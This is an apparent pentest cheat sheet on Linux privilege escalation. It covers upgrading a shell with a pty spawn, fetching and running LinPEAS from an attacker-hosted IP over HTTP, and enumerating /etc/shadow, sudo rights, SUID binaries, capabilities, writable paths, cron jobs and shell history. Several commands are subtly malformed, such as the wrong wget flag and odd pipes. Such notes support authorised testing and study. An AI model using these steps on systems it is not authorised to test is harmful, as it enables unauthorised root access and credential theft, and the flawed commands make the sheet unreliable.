- Start with automated tools like LinPEAS, then proceed with manual enumeration. The following command is used to get a TTY shell
-  full access shell

```sh
python3 -c 'import pty; pty.spawn(["/bin/bash", "--rcfile", "/etc/bash.bashrc"])' 
```

  
### Automated Tools

```sh
python -m http.server 80
wget http://192.168.10.10/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh | ./linpeas.sh | ( ./linpeas.sh | tee filename.txt  )
```

### Manual Enumeration

- Approach permission checker/cron job/

- check read/write permission | sudo su

```
ls -la /etc/passwd/ | ls -la /etc/shadow 
```

```
 sudo -l 
```

```
find / -user root -perm -4000 -print 2>/dev/null
```

- (capabilities)(cap_setuid+ep)

```
 getcap -r / 2>/dev/null 
```

```
find / -perm -u=s -type f 2>/dev/null
```

```
find / -type f -perm 0777 | find / -writable -type d 2>/dev/null
```

-  (wildcarts)

cat /etc/crontab (normal) | grep "CRON" /var/log/syslog

```
history | cat .bashrc
```

- Backup files
